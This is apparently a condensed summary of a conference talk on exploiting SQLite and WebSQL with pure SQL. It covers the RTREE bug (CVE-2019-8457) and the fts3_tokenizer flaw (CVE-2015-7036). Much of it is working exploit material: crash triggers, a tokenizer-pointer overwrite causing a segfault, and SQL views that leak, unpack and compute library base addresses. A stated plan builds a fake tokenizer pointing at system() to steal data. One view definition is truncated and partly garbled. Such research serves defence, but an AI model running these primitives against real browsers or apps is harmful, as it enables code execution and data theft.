### WebSQL and SQLite Vulnerabilities

#### Creating a Log Table
```javascript
db.transaction(function (tx) {  
   tx.executeSql('CREATE TABLE IF NOT EXISTS LOGS (id unique, log)');  
   tx.executeSql('INSERT INTO LOGS (id, log) VALUES (1, "foobar")');  
   tx.executeSql('INSERT INTO LOGS (id, log) VALUES (2, "logmsg")');  
});
```

### WebSQL for Attackers
- **Untrusted Input into SQLite**: Injecting untrusted input can lead to vulnerabilities.
- **Reachable from Any Website**: WebSQL is accessible from any website, making it a potential attack vector.
- **Popular Browsers**: A few of the world's most popular browsers support WebSQL.
- **Bugs and JavaScript Interpreter**: Bugs in WebSQL can be exploited using JavaScript.

### WebSQL - Attacks
- **Research and Vulnerabilities**:
  - **CVE-2015-7036**: Untrusted pointer dereference in `fts3_tokenizer()`.
  - **Blackhat 2017 by Chaitin**: Type confusion in `fts3OptimizeFunc()`.
  - **Magellan Bugs by Tencent**: Integer overflow in `fts3SegReaderNext()`.

### Full Text Search (FTS)
- **Virtual Table Module**: FTS allows for full-text searches on a set of documents, often referred to as "Google for your SQLite database".
- **Virtual Tables**:
  - **Functionalities**: FTS, RTREE, CSV.
  - **SQL Perspective**: Virtual tables appear like regular tables or views.
  - **Behind the Scenes**: Queries and updates invoke callback methods on shadow tables.

### Shadow Tables
- **Example**:
  ```sql
  CREATE VIRTUAL TABLE vt USING FTS3 (content TEXT);
  INSERT INTO vt VALUES('Hello world');
  ```
  - **Shadow Tables**: `vt_content`, `vt_segdir`, `vt_segments`.

### RTREE Bug
- **RTREE Virtual Table**:
  - **Compilation**: Compiled with SQLite in macOS, iOS, and Windows 10.
  - **Geographical Indexing**:
    ```sql
    CREATE VIRTUAL TABLE demo_index USING rtree( 
       id, --integer 
       X, 
       Y 
    );
    ```
  - **Exploitation**:
    ```sql
    CREATE VIRTUAL TABLE vt USING RTREE(id, X, Y); 
    INSERT INTO vt VALUES('Definitely not an int', 1, 2); 
    SELECT rtreenode(2, id) FROM vt;
    ```
  - **Vulnerability**: CVE-2019-8457, now available in Windows 10.

### Scriptless Exploitation
- **Virtual Tables and Query Hijacking**:
  - **Query Hijacking**: Can trigger bugs at the C2 and cause a SEGFAULT.
  - **Flow Control**: Requires scripting, but SQL is Turing complete.
  - **Exploitation Primitives Wish-list**:
    - Leaking memory.
    - Unpacking of 64-bit pointers.
    - Pointer arithmetic.
    - Packing of 64-bit pointers.
    - Crafting complex fake objects in memory.
    - Heap spray.

### Exploitation with Pure SQL
- **Query Oriented Programming (QOP)**:
  - **Example**: The unfixed CVE-2015-7036.
  - **Tokenizer**:
    - **Default Tokenizer**: Splits strings by whitespaces.
    - **Custom Tokenizers**: Registered with `fts3_tokenizer()` in an SQL query.
  - **Exploitation**:
    ```sql
    sqlite> SELECT fts3_tokenizer('simple');
    ??=?1V 
    sqlite> SELECT hex(fts3_tokenizer('simple'));
    80A63DDB31560000
    sqlite> SELECT fts3_tokenizer('simple', x'4141414141414141');
    sqlite> CREATE VIRTUAL TABLE vt USING fts3 (content TEXT);
    Segmentation fault
    ```

### Exploitation Game Plan
- **Steps**:
  - Leak some pointers.
  - Calculate function addresses.
  - Create a fake tokenizer object with pointers to `system()`.
  - Spray fake tokenizer.
  - Override the default tokenizer function pointer.
  - Trigger the malicious tokenizer.
  - Achieve the desired outcome, e.g., stealing sensitive information.

### Memory Leak
- **Example**:
  ```sql
  sqlite3> SELECT SUBSTR((SELECT hex(fts3_tokenizer('simple'))), -2, 2)||  
                 SUBSTR((SELECT hex(fts3_tokenizer('simple'))), -4, 2)||  
                 SUBSTR((SELECT hex(fts3_tokenizer('simple'))), -6, 2)||  
                 SUBSTR((SELECT hex(fts3_tokenizer('simple'))), -8, 2)||  
                 SUBSTR((SELECT hex(fts3_tokenizer('simple'))), -10, 2)||  
                 SUBSTR((SELECT hex(fts3_tokenizer('simple'))), -12, 2)||  
                 SUBSTR((SELECT hex(fts3_tokenizer('simple'))), -14, 2)||  
                 SUBSTR((SELECT hex(fts3_tokenizer('simple'))), -16, 2); 
  +-----------------------------------------------------------------+ 
  | 00007F3D3254A8E0                                                | 
  +-----------------------------------------------------------------+
  sqlite3> CREATE VIRTUAL TABLE vt USING FTS3(content TEXT); 
  sqlite3> INSERT INTO vt values('some text'); 
  sqlite3> SELECT hex(vt) FROM vt WHERE content MATCH 'text'; 
  +---------------------+ 
  |  08C453FF88550000   | 
  +---------------------+
  ```

### Pseudo-variables
- **Using Views as Pseudo-variables**:
  ```sql
  sqlite3> CREATE VIEW le_leak AS SELECT hex(fts3_tokenizer("simple")) AS col; 
  sqlite3> CREATE VIEW leak AS SELECT SUBSTR((SELECT col FROM le_leak), -2, 2)||  
                 SUBSTR((SELECT col FROM le_leak), -4, 2)||  
                 SUBSTR((SELECT col FROM le_leak), -6, 2)||  
                 SUBSTR((SELECT col FROM le_leak), -8, 2)||  
                 SUBSTR((SELECT col FROM le_leak), -10, 2)||  
                 SUBSTR((SELECT col FROM le_leak), -12, 2)||  
                 SUBSTR((SELECT col FROM le_leak), -14, 2)||  
                 SUBSTR((SELECT col FROM le_leak), -16, 2) AS col; 
  sqlite3> SELECT col FROM leak; 
  +------------------+ 
  | 00007F3D3254A8E0 | 
  +------------------+
  ```

### Unpacking of 64-bit Pointers
- **Converting Pointers to Integers**:
  ```sql
  sqlite3> CREATE VIEW u64_leak AS SELECT (  
               (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM leak), -1,  1)) -1) * (1  
  sqlite3> SELECT col FROM u64_leak; 
  +-----------------+ 
  | 139900814141664 | 
  +-----------------+
  ```

### Pointer Arithmetic
- **Calculating Base Addresses**:
  ```sql
  sqlite3> CREATE VIEW u64_libsqlite_base AS SELECT (  
                (SELECT col FROM u64_leak ) - ( SELECT ‘3164384') 
                ) as col; 
  sqlite3> SELECT col FROM u64_libsqlite_base; 
  +-----------------+ 
  | 140713244319744 | 
  +-----------------+
  ```

### Packing of 64-bit Pointers
- **Writing Back Manipulated Pointers**:
  ```sql
  sqlite3> SELECT char(0x41); 
  +------------+ 
  | A          | 
  +------------+ 
  sqlite3> SELECT hex(char(0x41)); 
  +-----------------+ 
  | 41              | 
  +-----------------+ 
  sqlite3> SELECT char(0xFF); 
  +------------+ 
  | ÿ          | 
  +------------+
  ```

This document provides a comprehensive overview of exploiting WebSQL and SQLite, including detailed examples and steps for various exploitation techniques.